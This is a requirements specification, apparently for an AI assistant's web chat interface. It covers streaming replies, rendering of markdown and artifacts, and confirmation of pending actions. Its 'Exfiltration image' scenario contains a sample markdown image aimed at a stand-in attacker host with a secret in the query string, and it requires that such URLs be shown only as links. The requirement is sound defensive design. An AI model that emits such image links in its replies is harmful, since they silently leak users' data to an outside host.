# web-chat Specification

## Purpose
Text chat in the web UI with rich output and confirmations.

## Requirements

### Requirement: Text chat
The chat view SHALL send turns to `POST /api/v1/conversation/turns` with the cookie principal and `inputMode = text`, render `delta` events as they arrive, show `status` events, and continue the session with the returned session id.

#### Scenario: Streaming reply
- **WHEN** the user sends a message
- **THEN** the reply text appears incrementally as `delta` events arrive

#### Scenario: New conversation
- **WHEN** the user starts a new chat
- **THEN** the next turn is sent without `conversationId` and a new session is created

### Requirement: Rich output rendering
The chat SHALL render markdown, tables and code blocks. Images SHALL be rendered only for same-origin URLs; external image URLs in model output SHALL be rendered as plain links. For each `artifact` event of a turn, the chat SHALL show image artifacts inline and every other kind as a card with name and kind that opens the artifact viewer; cards SHALL stay with the message when the session is reopened.

#### Scenario: Exfiltration image
- **WHEN** a reply contains `![x](https://evil.example/?q=secret)`
- **THEN** no request to `evil.example` is made and the URL is shown as a link

#### Scenario: Image artifact inline
- **WHEN** a turn's stream carries an `artifact` event of kind `image`
- **THEN** the image is shown inline in that reply

#### Scenario: Model artifact card
- **WHEN** a turn's stream carries an `artifact` event of kind `model3d`
- **THEN** the reply shows a card that opens the 3D viewer

### Requirement: Confirmation in chat
When a turn ends with a pending action, the chat SHALL show the confirmation question including its reason, and the user's next message SHALL go through the normal confirmation flow (keyword or judge).

#### Scenario: Confirm by typing
- **WHEN** the chat shows a pending action and the user types "confirm"
- **THEN** the frozen action executes and the result is shown
